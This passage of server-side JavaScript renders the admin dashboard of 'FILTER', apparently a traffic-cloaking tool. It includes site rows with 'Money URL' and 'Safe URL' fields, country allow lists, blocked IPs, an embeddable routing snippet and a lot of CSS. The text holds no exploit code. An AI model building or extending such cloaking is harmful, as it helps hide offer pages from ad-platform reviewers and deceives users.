  }).join('') || '<tr><td colspan="3" class="t-muted t-center">No blocks recorded</td></tr>';

  // ── New site list rows for FILTER UI ─────────────────────────────────────
  var siteListHtml = sites.map(function(s) {
    var dsCls = { live:'db-live', pushed:'db-pushed', building:'db-pushed', pending:'db-pending', failed:'db-failed', 'key-rotated':'db-rotated' }[s.deployStatus] || 'db-pending';
    var dsLabel = { live:'Live', pushed:'GitHub ✓', building:'Deploying…', pending:'Pending', failed:'Failed', 'key-rotated':'Key Rotated' }[s.deployStatus] || 'Pending';
    var mk  = s.apiKey ? s.apiKey.slice(0, 8) + '••••' + s.apiKey.slice(-4) : '—';
    var safeHref  = hubUrl + '/sites/' + s.id + '/safe';
    var moneyHref = hubUrl + '/sites/' + s.id + '/money';
    var snip = siteSnippet(s);
    var isEnabled = s.isDefault ? settings.enabled !== false : s.enabled !== false;
    var sid = escHtml(s.id);

    return '<div style="margin-bottom:8px">'
      + '<div class="sl-row" data-site-id="' + sid + '" data-deploy-status="' + escHtml(s.deployStatus || 'pending') + '">'
      +   '<div class="sl-icon">🌐</div>'
      +   '<div class="sl-info">'
      +     '<div class="sl-name">' + escHtml(s.name) + (s.isDefault ? ' <span class="rpill rpill-grey" style="font-size:0.62rem">DEFAULT</span>' : '') + '</div>'
      +     '<div class="sl-domain">' + escHtml(s.domain || '—') + '</div>'
      +   '</div>'
      +   '<span class="' + dsCls + '" style="flex-shrink:0">' + escHtml(dsLabel) + '</span>'
      +   '<div class="sl-key-wrap"><span class="sl-key-val" title="' + escHtml(s.apiKey || '') + '">' + escHtml(mk) + '</span>'
      +     '<button class="btn-ghost btn-sm" onclick="copyKey(\'\',\'' + escHtml(s.apiKey || '') + '\',this)" style="padding:2px 7px;font-size:0.68rem">Copy</button>'
      +   '</div>'
      +   '<form method="POST" action="/admin/sites/' + sid + '/toggle" class="inline">'
      +     '<label class="ts-wrap"><input type="checkbox" class="ts-input" ' + (isEnabled ? 'checked' : '') + ' onchange="this.closest(\'form\').submit()"><span class="ts-track"></span>'
      +     '<span class="ts-label" style="font-size:0.75rem">' + (isEnabled ? 'Active' : 'Paused') + '</span></label>'
      +   '</form>'
      +   '<div class="sl-actions">'
      +     '<button class="sl-settings" onclick="toggleSlRow(this,\'slx-' + sid + '\')">\u2699 Settings</button>'
      +     (s.isDefault ? '' :
      +       '<form method="POST" action="/admin/sites/' + sid + '/regenerate-key" class="inline" onsubmit="return confirm(\'Rotate API key? Old key stops immediately.\')">'
      +         '<button type="submit" class="btn-ghost btn-sm">\u21BB Rotate</button>'
      +       '</form>'
      +       '<form method="POST" action="/admin/sites/' + sid + '/delete" class="inline" onsubmit="return confirm(\'Delete ' + escHtml(s.name) + '? Cannot be undone.\')">'
      +         '<button type="submit" class="btn-danger btn-sm">Delete</button>'
      +       '</form>')
      +   '</div>'
      + '</div>'
      + '<div class="sl-expand" id="slx-' + sid + '">'
      +   '<div class="sl-tabs">'
      +     '<button class="sl-tab active" onclick="switchSlTab(this,\'slt-g-' + sid + '\')">General</button>'
      +     '<button class="sl-tab" onclick="switchSlTab(this,\'slt-sec-' + sid + '\')">Security</button>'
      +     '<button class="sl-tab" onclick="switchSlTab(this,\'slt-snip-' + sid + '\')">Script</button>'
      +     '<button class="sl-tab" onclick="switchSlTab(this,\'slt-rw-' + sid + '\')">Railway</button>'
      +   '</div>'
      +   '<div class="sl-tab-content active" id="slt-g-' + sid + '">'
      +     '<form method="POST" action="/admin/sites/' + sid + '/settings">'
      +       '<div class="form-grid2">'
      +         '<div class="form-row"><label>Site Name</label><input type="text" name="name" value="' + escHtml(s.name) + '"></div>'
      +         '<div class="form-row"><label>Domain</label><input type="text" name="domain" value="' + escHtml(s.domain || '') + '" placeholder="example.com"></div>'
      +         '<div class="form-row"><label>Money URL</label><input type="text" name="moneyUrl" value="' + escHtml(s.moneyUrl || '') + '" placeholder="https://your-offer-url.com"></div>'
      +         '<div class="form-row"><label>Safe URL <span class="hint" style="display:inline">(blank = hub)</span></label><input type="text" name="safeUrl" value="' + escHtml(s.safeUrl || '') + '" placeholder="' + escHtml(safeHref) + '"></div>'
      +         '<div class="form-row"><label>GitHub Repo</label><input type="text" name="githubRepo" value="' + escHtml(s.githubRepo || '') + '" placeholder="https://github.com/user/repo"></div>'
      +         '<div class="form-row"><label>Allowed Countries</label><input type="text" name="allowedCountries" value="' + escHtml((s.allowedCountries || []).join(', ')) + '" placeholder="US CA GB"></div>'
      +       '</div>'
      +       '<button type="submit" class="btn-pri mt12">Save &amp; Push</button>'
      +     '</form>'
      +   '</div>'
      +   '<div class="sl-tab-content" id="slt-sec-' + sid + '">'
      +     '<form method="POST" action="/admin/sites/' + sid + '/settings">'
      +       '<div class="form-row"><label>Blocked IPs (one per line)</label><textarea name="blockedIps" rows="5">' + escHtml((s.blockedIps || []).join('\n')) + '</textarea></div>'
      +       '<input type="hidden" name="name" value="' + escHtml(s.name) + '">'
      +       '<input type="hidden" name="domain" value="' + escHtml(s.domain || '') + '">'
      +       '<button type="submit" class="btn-pri mt8">Save Security</button>'
      +     '</form>'
      +   '</div>'
      +   '<div class="sl-tab-content" id="slt-snip-' + sid + '">'
      +     '<p class="hint mb12">Paste this in the &lt;head&gt; of your landing page. FILTER will route all traffic automatically.</p>'
      +     '<div style="position:relative"><button class="btn-ghost btn-sm" onclick="copySnippetById(\'snip2-' + sid + '\',this)" style="position:absolute;top:8px;right:8px;z-index:1">Copy</button>'
      +     '<pre class="snippet-pre" id="snip2-' + sid + '">' + escHtml(snip) + '</pre></div>'
      +     '<div class="mt12 flex-gap8"><span class="hint">Hub safe: <a href="' + escHtml(safeHref) + '" target="_blank" style="color:var(--pri-l)">' + escHtml(safeHref) + '</a></span></div>'
      +   '</div>'
      +   '<div class="sl-tab-content" id="slt-rw-' + sid + '">'
      +     '<form method="POST" action="/admin/sites/' + sid + '/settings">'
      +       '<div class="form-grid2">'
      +         '<div class="form-row"><label>Railway Project ID</label><input type="text" name="railwayProjectId" value="' + escHtml(s.railwayProjectId || '') + '" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"></div>'
      +         '<div class="form-row"><label>Railway Service ID</label><input type="text" name="railwayServiceId" value="' + escHtml(s.railwayServiceId || '') + '" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"></div>'
      +       '</div>'
      +       '<input type="hidden" name="name" value="' + escHtml(s.name) + '">'
      +       '<button type="submit" class="btn-pri mt12">Save Railway Config</button>'
      +     '</form>'
      +   '</div>'
      + '</div>'
      + '</div>';
  }).join('');

  // ── Recent events for live feed (server-rendered initial state) ───────────
  function liveRow(l) {
    var ts  = fmtTs(l.ts) || (l.ts ? l.ts.replace('T',' ').slice(0,19) : '');
    var loc = (l.city ? escHtml(l.city) + ' ' : '') + escHtml(l.country || 'XX');
    var cls = l.decision === 'allow' ? 'lt-dec-allow' : 'lt-dec-block';
    var flag = flagEmoji(l.country);
    return '<div class="lt-row">'
      + '<span class="lt-ts">' + escHtml(ts.split(',')[1] || ts).trim() + '</span>'
      + '<span class="lt-ip">' + escHtml(l.ip || '') + '</span>'
      + '<span class="lt-loc">' + flag + ' ' + escHtml(l.country || 'XX') + '</span>'
      + '<span class="' + cls + '">' + escHtml(l.decision || '') + '</span>'
      + '</div>';
  }
  var liveInitRows = recentEvents.map(liveRow).join('');
  var activeIpTimesJson = JSON.stringify(activeIpTimes)
    .replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026');

  var siteOptHtml = sites.map(function(s) {
    return '<option value="' + escHtml(s.id) + '"' + (s.id === siteFilter ? ' selected' : '') + '>' + escHtml(s.name) + (s.isDefault ? ' (default)' : '') + '</option>';
  }).join('');

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FILTER — Traffic Management</title>
<style>
:root{--bg:#070010;--bg2:#0d001e;--bg3:#130028;--card:#0f0022;--border:#1e0840;--border2:#2e1260;--pri:#7c3aed;--pri-h:#6d28d9;--pri-l:#a855f7;--text:#e2d9f3;--text2:#9983b8;--text3:#4e3d70;--green:#22c55e;--red:#ef4444;--amber:#f59e0b;--blue:#60a5fa;--sidebar:240px;--topbar:56px}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.5;overflow:hidden;height:100vh}
/* Layout */
.f-app{display:flex;height:100vh;overflow:hidden}
.f-sidebar{width:var(--sidebar);min-width:var(--sidebar);background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto;z-index:200;transition:transform .3s;flex-shrink:0}
.f-main{flex:1;min-width:0;display:flex;flex-direction:column;height:100vh;overflow:hidden}
.f-topbar{height:var(--topbar);background:var(--bg2);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;padding:0 20px;flex-shrink:0}
.f-content{flex:1;overflow-y:auto;padding:24px;background:var(--bg)}
/* Sidebar brand */
.sb-brand{padding:18px 16px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid var(--border)}
.sb-logo{width:30px;height:30px;flex-shrink:0}
.sb-name{font-size:1.05rem;font-weight:800;color:var(--text);letter-spacing:-0.5px}
.sb-tagline{font-size:0.58rem;color:var(--text3);text-transform:uppercase;letter-spacing:1.2px;margin-top:1px}
/* Nav */
.sb-nav{flex:1;padding:10px 8px;display:flex;flex-direction:column;gap:1px}
.sb-sec-lbl{font-size:0.59rem;color:var(--text3);text-transform:uppercase;letter-spacing:1px;padding:10px 10px 3px;font-weight:700}
.sb-link{display:flex;align-items:center;gap:9px;padding:8px 10px;border-radius:7px;font-size:0.81rem;color:var(--text2);text-decoration:none;cursor:pointer;border:none;background:none;width:100%;transition:all .15s;text-align:left}
.sb-link:hover{background:rgba(124,58,237,.12);color:var(--pri-l)}
.sb-link.active{background:rgba(124,58,237,.18);color:var(--text);font-weight:600}
.sb-icon{font-size:0.88rem;width:18px;text-align:center;flex-shrink:0}
.sb-cnt{margin-left:auto;background:var(--pri);color:#fff;font-size:0.6rem;font-weight:700;padding:1px 6px;border-radius:10px}
/* Site selector */
.sb-site-wrap{padding:10px;border-top:1px solid var(--border)}
.sb-site-lbl{font-size:0.59rem;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px;display:block;font-weight:700}
.sb-site-sel{width:100%;background:var(--bg3);border:1px solid var(--border2);border-radius:7px;color:var(--text);font-size:0.77rem;padding:6px 9px;outline:none;cursor:pointer}
.sb-site-sel:focus{border-color:var(--pri)}
/* Footer */
.sb-footer{padding:10px 14px;border-top:1px solid var(--border);font-size:0.68rem;color:var(--text3);display:flex;justify-content:space-between;align-items:center}
.sb-footer a{color:var(--text3);text-decoration:none}
.sb-footer a:hover{color:var(--red)}
/* Topbar */
.f-hamburger{display:none;background:none;border:none;color:var(--text2);cursor:pointer;padding:5px;border-radius:6px;font-size:1.1rem;align-items:center;justify-content:center}
.f-breadcrumb{font-size:0.85rem;font-weight:600;color:var(--text);flex:1}
.f-topbar-right{display:flex;align-items:center;gap:8px}
.f-clock{font-size:0.72rem;color:var(--text3);font-family:'SF Mono',Menlo,monospace;background:var(--bg3);padding:4px 9px;border-radius:6px;white-space:nowrap}
.f-tz-badge{font-size:0.67rem;color:var(--pri-l);background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.2);border-radius:6px;padding:3px 7px;cursor:pointer;white-space:nowrap}
.f-tz-badge:hover{background:rgba(168,85,247,.18)}
/* Sections */
.f-section{display:none}.f-section.active{display:block}
/* Notifications */
.notif-wrap{position:relative}
.notif-btn{background:none;border:none;cursor:pointer;padding:6px;border-radius:7px;color:var(--text2);display:flex;align-items:center;justify-content:center;transition:background .15s;position:relative}
.notif-btn:hover{background:rgba(124,58,237,.15);color:var(--pri-l)}
.notif-badge{position:absolute;top:-1px;right:-1px;background:var(--red);color:#fff;font-size:0.58rem;font-weight:800;border-radius:8px;padding:1px 4px;min-width:14px;text-align:center;display:none;line-height:1.4}
.notif-badge.show{display:block}
.notif-dropdown{position:absolute;top:calc(100% + 8px);right:0;width:330px;background:var(--bg2);border:1px solid var(--border2);border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.6);z-index:999;display:none}
.notif-dropdown.open{display:block}
.notif-hdr{display:flex;justify-content:space-between;align-items:center;padding:11px 14px;border-bottom:1px solid var(--border)}
.notif-hdr span{font-size:0.75rem;font-weight:700;color:var(--pri-l);text-transform:uppercase;letter-spacing:1px}
.notif-clear{background:none;border:none;color:var(--text3);font-size:0.7rem;cursor:pointer;padding:3px 7px;border-radius:5px}
.notif-clear:hover{color:var(--red)}
.notif-list{max-height:300px;overflow-y:auto}
.notif-item{padding:9px 14px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:2px}
.notif-item:last-child{border-bottom:none}
.notif-ip{font-size:0.74rem;font-family:'SF Mono',Menlo,monospace;color:var(--pri-l)}
.notif-dec-allow{color:var(--green);font-size:0.68rem;font-weight:700}
.notif-dec-block{color:var(--red);font-size:0.68rem;font-weight:700}
.notif-time{font-size:0.64rem;color:var(--text3)}
.notif-empty{text-align:center;padding:20px;font-size:0.75rem;color:var(--text3)}
/* KPI */
.kpi-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:18px}
.kpi{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px 18px;transition:border-color .2s}
.kpi:hover{border-color:var(--border2)}
.kpi-label{font-size:0.64rem;color:var(--text3);text-transform:uppercase;letter-spacing:.8px;font-weight:700;margin-bottom:8px}
.kpi-val{font-size:1.75rem;font-weight:800;color:var(--text);line-height:1;font-variant-numeric:tabular-nums}
.kpi-sub{font-size:0.69rem;color:var(--text3);margin-top:5px}
.kpi-green .kpi-val{color:var(--green)}.kpi-red .kpi-val{color:var(--red)}.kpi-purple .kpi-val{color:var(--pri-l)}.kpi-blue .kpi-val{color:var(--blue)}
/* Dashboard grid */
.dash-mid{display:grid;grid-template-columns:1fr 2fr 1fr;gap:14px;margin-bottom:16px}
.dash-bot{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px}
/* Cards */
.f-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px}
.f-card-title{font-size:0.68rem;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.8px;margin-bottom:14px;display:flex;align-items:center;justify-content:space-between}
/* Charts */
#donutWrap{position:relative;display:flex;justify-content:center;align-items:center;height:170px}
.donut-center{position:absolute;text-align:center;pointer-events:none}
.donut-pct{font-size:1.5rem;font-weight:800}
.donut-lbl{font-size:0.62rem;color:var(--text3);text-transform:uppercase;letter-spacing:1px}
.chart-legend{display:flex;gap:12px;flex-wrap:wrap;margin-top:10px}
.leg-item{display:flex;align-items:center;gap:5px;font-size:0.7rem;color:var(--text2)}
.leg-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
#barChartWrap{height:150px}
/* Live ticker */
.live-top{display:flex;align-items:center;gap:8px;margin-bottom:12px}
.live-dot{width:7px;height:7px;border-radius:50%;background:var(--green);animation:pulse 1.4s infinite}
.live-cnt{font-size:1.3rem;font-weight:800;color:var(--green);margin-left:auto}
.lt-feed{display:flex;flex-direction:column;gap:3px;max-height:240px;overflow-y:auto}
.lt-row{display:grid;grid-template-columns:80px 1fr auto;gap:6px;align-items:center;padding:5px 7px;border-radius:6px;font-size:0.7rem}
.lt-row:hover{background:rgba(124,58,237,.08)}
.lt-ts{font-family:'SF Mono',Menlo,monospace;color:var(--text3);font-size:0.64rem}
.lt-ip{font-family:'SF Mono',Menlo,monospace;color:var(--text2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.lt-dec-allow{color:var(--green);font-weight:700;font-size:0.66rem;text-transform:uppercase;text-align:right}
.lt-dec-block{color:var(--red);font-weight:700;font-size:0.66rem;text-transform:uppercase;text-align:right}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
/* Tables */
.f-table-wrap{overflow-x:auto;border-radius:8px;border:1px solid var(--border)}
table{width:100%;border-collapse:collapse;font-size:0.76rem}
thead th{background:var(--bg2);padding:8px 11px;text-align:left;font-size:0.63rem;text-transform:uppercase;letter-spacing:.6px;color:var(--text3);font-weight:700;white-space:nowrap;position:sticky;top:0;z-index:1}
tbody tr{border-top:1px solid var(--border)}
tbody tr:hover{background:rgba(124,58,237,.05)}
tbody td{padding:7px 11px;color:var(--text2);vertical-align:middle}
.t-mono{font-family:'SF Mono',Menlo,monospace;font-size:0.69rem}
.t-ts{color:var(--text3)}.t-ip{color:var(--pri-l)}.t-flag{font-size:.95rem}
.t-isp{max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.t-tz,.t-screen{color:var(--text3)}.t-right{text-align:right}.t-center{text-align:center}.t-muted{color:var(--text3)}
/* Decision pills */
.dec-allow{display:inline-block;padding:2px 8px;border-radius:20px;background:rgba(34,197,94,.1);color:var(--green);font-weight:700;font-size:0.64rem;text-transform:uppercase;border:1px solid rgba(34,197,94,.18)}
.dec-block{display:inline-block;padding:2px 8px;border-radius:20px;background:rgba(239,68,68,.1);color:var(--red);font-weight:700;font-size:0.64rem;text-transform:uppercase;border:1px solid rgba(239,68,68,.18)}
/* Quick block */
.quick-block-btn{background:none;border:none;cursor:pointer;color:var(--text3);font-size:.88rem;padding:2px 4px;border-radius:4px;transition:color .15s}
.quick-block-btn:hover{color:var(--red);background:rgba(239,68,68,.1)}
.quick-block-btn.blocked{color:var(--red);cursor:default}
/* Filter bar */
.filter-bar{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;align-items:center}
.filter-input,.filter-select{background:var(--bg2);border:1px solid var(--border2);border-radius:7px;color:var(--text);font-size:0.78rem;padding:6px 11px;outline:none}
.filter-input:focus,.filter-select:focus{border-color:var(--pri)}
.filter-input{min-width:150px}.filter-select{cursor:pointer}
/* Sites section */
.site-list{display:flex;flex-direction:column;gap:8px}
.sl-row{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:12px 14px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
.sl-icon{width:34px;height:34px;border-radius:8px;background:var(--bg3);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:.95rem;flex-shrink:0}
.sl-info{flex:1;min-width:120px}
.sl-name{font-size:.85rem;font-weight:700;color:var(--text)}
.sl-domain{font-size:.7rem;color:var(--text3);margin-top:1px}
.sl-key-wrap{display:flex;align-items:center;gap:5px;background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:4px 9px}
.sl-key-val{font-family:'SF Mono',Menlo,monospace;font-size:.65rem;color:var(--pri-l);max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sl-actions{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
.sl-settings{background:none;border:1px solid var(--border2);border-radius:7px;padding:5px 10px;color:var(--text2);font-size:.73rem;cursor:pointer;transition:all .15s}
.sl-settings:hover,.sl-settings.open{border-color:var(--pri);color:var(--pri-l);background:rgba(124,58,237,.08)}
.sl-expand{display:none;margin-top:10px;border-top:1px solid var(--border);padding-top:14px}
.sl-expand.open{display:block}
.sl-tabs{display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap}
.sl-tab{background:none;border:1px solid var(--border);border-radius:7px;padding:4px 11px;color:var(--text2);font-size:.73rem;cursor:pointer;transition:all .15s}
.sl-tab.active,.sl-tab:hover{border-color:var(--pri);color:var(--pri-l);background:rgba(124,58,237,.08)}
.sl-tab-content{display:none}.sl-tab-content.active{display:block}
.snippet-pre{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:14px;font-family:'SF Mono',Menlo,monospace;font-size:.65rem;color:#7dd3a8;line-height:1.6;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:240px;overflow-y:auto}
/* Toggle switches */
.ts-wrap{display:inline-flex;align-items:center;gap:7px;cursor:pointer}
.ts-input{display:none}
.ts-track{width:38px;height:20px;background:var(--bg);border-radius:10px;border:1px solid var(--border2);position:relative;transition:background .2s,border-color .2s;flex-shrink:0}
.ts-track::after{content:'';position:absolute;top:3px;left:3px;width:12px;height:12px;background:#555;border-radius:50%;transition:transform .2s,background .2s}
.ts-input:checked+.ts-track{background:rgba(34,197,94,.2);border-color:var(--green)}
.ts-input:checked+.ts-track::after{transform:translateX(18px);background:var(--green)}
.ts-label{font-size:.78rem;color:var(--text2);user-select:none}
/* Status badges */
.db-live{display:inline-block;padding:2px 8px;border-radius:20px;font-size:.64rem;font-weight:700;text-transform:uppercase;background:rgba(34,197,94,.1);color:var(--green);border:1px solid rgba(34,197,94,.18)}
.db-pushed{background:rgba(96,165,250,.1);color:var(--blue);border:1px solid rgba(96,165,250,.18);display:inline-block;padding:2px 8px;border-radius:20px;font-size:.64rem;font-weight:700;text-transform:uppercase}
.db-pending{background:rgba(245,158,11,.1);color:var(--amber);border:1px solid rgba(245,158,11,.18);display:inline-block;padding:2px 8px;border-radius:20px;font-size:.64rem;font-weight:700;text-transform:uppercase}
.db-rotated,.db-failed{background:rgba(168,85,247,.1);color:var(--pri-l);border:1px solid rgba(168,85,247,.18);display:inline-block;padding:2px 8px;border-radius:20px;font-size:.64rem;font-weight:700;text-transform:uppercase}
/* Pills */
.rpill{display:inline-block;padding:2px 8px;border-radius:20px;font-size:.65rem;font-weight:600}
.rpill-green{background:rgba(34,197,94,.1);color:var(--green);border:1px solid rgba(34,197,94,.15)}
.rpill-red{background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.15)}
.rpill-orange{background:rgba(249,115,22,.1);color:#fb923c;border:1px solid rgba(249,115,22,.15)}
.rpill-amber{background:rgba(245,158,11,.1);color:var(--amber);border:1px solid rgba(245,158,11,.15)}
.rpill-grey{background:rgba(255,255,255,.05);color:var(--text3);border:1px solid var(--border)}
/* Buttons */
.btn-pri{background:var(--pri);color:#fff;border:none;border-radius:8px;padding:8px 16px;font-size:.8rem;font-weight:600;cursor:pointer;transition:background .2s;display:inline-flex;align-items:center;gap:5px}
.btn-pri:hover{background:var(--pri-h)}
.btn-ghost{background:none;border:1px solid var(--border2);border-radius:7px;padding:6px 13px;color:var(--text2);font-size:.78rem;cursor:pointer;transition:all .15s}
.btn-ghost:hover{border-color:var(--pri);color:var(--pri-l)}
.btn-danger{background:none;border:1px solid rgba(239,68,68,.3);border-radius:7px;padding:6px 13px;color:var(--red);font-size:.78rem;cursor:pointer;transition:all .15s}
.btn-danger:hover{background:rgba(239,68,68,.1)}
.btn-sm{padding:4px 10px;font-size:.72rem;border-radius:6px}
/* Forms */
label{display:block;font-size:.7rem;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px}
input[type=text],input[type=password],input[type=url],input[type=email],textarea,select{width:100%;background:var(--bg2);border:1px solid var(--border2);border-radius:8px;color:var(--text);font-size:.82rem;padding:8px 12px;outline:none;font-family:inherit;transition:border-color .15s}
input[type=text]:focus,input[type=password]:focus,input[type=url]:focus,input[type=email]:focus,textarea:focus,select:focus{border-color:var(--pri)}
textarea{resize:vertical;min-height:80px}
.form-grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.form-row{margin-bottom:11px}
.hint{font-size:.68rem;color:var(--text3)}
/* Settings tabs */
.stabs{display:flex;gap:2px;margin-bottom:20px;border-bottom:1px solid var(--border);flex-wrap:wrap}
.stab{background:none;border:none;border-bottom:2px solid transparent;padding:8px 14px;color:var(--text3);font-size:.79rem;font-weight:600;cursor:pointer;transition:all .15s;margin-bottom:-1px}
.stab:hover{color:var(--text2)}
.stab.active{color:var(--pri-l);border-bottom-color:var(--pri)}
.stab-content{display:none}.stab-content.active{display:block}
/* Danger zone */
.danger-zone{border:1px solid rgba(239,68,68,.25);border-radius:10px;padding:16px}
.danger-title{color:var(--red);font-size:.78rem;font-weight:700;text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px}
/* Modal */
.f-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:500;align-items:center;justify-content:center;padding:20px}
.f-modal.open{display:flex}
.f-modal-box{background:var(--bg2);border:1px solid var(--border2);border-radius:14px;padding:24px;width:100%;max-width:560px;max-height:90vh;overflow-y:auto}
.f-modal-hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
.f-modal-title{font-size:.95rem;font-weight:700;color:var(--text)}
.f-modal-close{background:none;border:none;color:var(--text3);font-size:1.1rem;cursor:pointer;padding:3px 7px;border-radius:6px}
.f-modal-close:hover{color:var(--red);background:rgba(239,68,68,.1)}
/* Toast */
.f-toasts{position:fixed;top:18px;right:18px;z-index:9999;display:flex;flex-direction:column;gap:7px;pointer-events:none}
.f-toast{background:var(--bg2);border:1px solid var(--border2);border-radius:10px;padding:11px 14px;font-size:.8rem;color:var(--text);box-shadow:0 4px 20px rgba(0,0,0,.5);pointer-events:auto;display:flex;align-items:center;gap:9px;min-width:220px;animation:slideIn .22s ease-out}
.f-toast.success{border-color:rgba(34,197,94,.4)}.f-toast.error{border-color:rgba(239,68,68,.4)}
@keyframes slideIn{from{transform:translateX(110%);opacity:0}to{transform:translateX(0);opacity:1}}
@keyframes slideOut{from{transform:translateX(0);opacity:1}to{transform:translateX(110%);opacity:0}}
/* Alert banners */
.f-alert{border-radius:9px;padding:11px 14px;font-size:.76rem;margin-bottom:14px}
.f-alert-warn{background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.22);color:var(--amber)}
.f-alert-info{background:rgba(96,165,250,.08);border:1px solid rgba(96,165,250,.22);color:var(--blue)}
/* Helpers */
.inline{display:inline}.flex-gap8{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.mt8{margin-top:8px}.mt12{margin-top:12px}.mt16{margin-top:16px}.mt20{margin-top:20px}
.mb8{margin-bottom:8px}.mb12{margin-bottom:12px}.mb16{margin-bottom:16px}
.full-w{width:100%}.sec-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;flex-wrap:wrap;gap:10px}
.sec-title{font-size:1.05rem;font-weight:700;color:var(--text)}
.sec-sub{font-size:.74rem;color:var(--text3)}
.empty-state{text-align:center;padding:28px;color:var(--text3);font-size:.8rem}
/* Pagination */
.f-pagination{display:flex;align-items:center;gap:8px;margin-top:12px;justify-content:center;flex-wrap:wrap}
.f-pag-btn{padding:5px 13px;border-radius:7px;background:var(--bg2);border:1px solid var(--border2);color:var(--pri-l);font-size:.76rem;font-weight:600;text-decoration:none;transition:background .15s}
.f-pag-btn:hover{background:var(--bg3)}
.f-pag-disabled{padding:5px 13px;border-radius:7px;background:var(--bg);border:1px solid var(--border);color:var(--text3);font-size:.76rem;font-weight:600;cursor:default}
.f-pag-info{font-size:.73rem;color:var(--text3)}
/* Country bar */
.cc-row{display:flex;align-items:center;gap:8px;padding:5px 0}
.cc-flag{font-size:.9rem;width:20px}
.cc-code{font-size:.72rem;font-family:'SF Mono',Menlo,monospace;color:var(--text2);width:24px}
.cc-bar-wrap{flex:1;height:6px;background:var(--bg);border-radius:3px;overflow:hidden}
.cc-bar{height:100%;background:var(--pri);border-radius:3px}
.cc-cnt{font-size:.69rem;color:var(--text3);width:28px;text-align:right}
/* Overlay + mobile */
.f-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:150}
@media(max-width:960px){.kpi-grid{grid-template-columns:repeat(3,1fr)}.dash-mid{grid-template-columns:1fr}.dash-bot{grid-template-columns:1fr}}
@media(max-width:700px){
  .f-sidebar{position:fixed;left:0;top:0;bottom:0;transform:translateX(-100%);z-index:200}
  .f-sidebar.open{transform:translateX(0)}
  .f-overlay.open{display:block}
  .f-hamburger{display:flex}
  .kpi-grid{grid-template-columns:repeat(2,1fr)}
  .form-grid2{grid-template-columns:1fr}
}
</style>
</head>
<body>
<div class="f-app" id="fApp">

  <!-- ═══ SIDEBAR ═══ -->
  <aside class="f-sidebar" id="fSidebar">

    <!-- Brand -->
    <div class="sb-brand">
      <svg class="sb-logo" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
        <defs><linearGradient id="lg1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#a855f7"/><stop offset="100%" stop-color="#6d28d9"/></linearGradient></defs>
        <path d="M4 5h24l-9.5 11.5V27l-5-2.5V16.5L4 5z" fill="url(#lg1)" stroke="#7c3aed" stroke-width="1"/>
        <path d="M8 9h16" stroke="rgba(255,255,255,.3)" stroke-width="1" stroke-linecap="round"/>
        <path d="M11 13h10" stroke="rgba(255,255,255,.25)" stroke-width="1" stroke-linecap="round"/>
      </svg>
      <div>
        <div class="sb-name">FILTER</div>
        <div class="sb-tagline">Traffic Management</div>
      </div>
    </div>

    <!-- Nav -->
    <nav class="sb-nav">
      <div class="sb-sec-lbl">Main</div>
      <button class="sb-link active" data-section="dashboard" onclick="navTo('dashboard',this)">
        <span class="sb-icon">⬡</span> Dashboard
      </button>
      <button class="sb-link" data-section="sites" onclick="navTo('sites',this)">
        <span class="sb-icon">◈</span> Sites
        <span class="sb-cnt">${sites.length}</span>
      </button>

      <div class="sb-sec-lbl" style="margin-top:6px">Traffic</div>
      <button class="sb-link" data-section="logs" onclick="navTo('logs',this)">
        <span class="sb-icon">≡</span> Traffic Logs
        <span class="sb-cnt">${logTotal}</span>
      </button>
      <button class="sb-link" data-section="leads" onclick="navTo('leads',this)">
        <span class="sb-icon">◎</span> Leads
        <span class="sb-cnt">${leadTotal}</span>
      </button>

      <div class="sb-sec-lbl" style="margin-top:6px">Config</div>
      <button class="sb-link" data-section="settings" onclick="navTo('settings',this)">
        <span class="sb-icon">⚙</span> Settings
      </button>
    </nav>

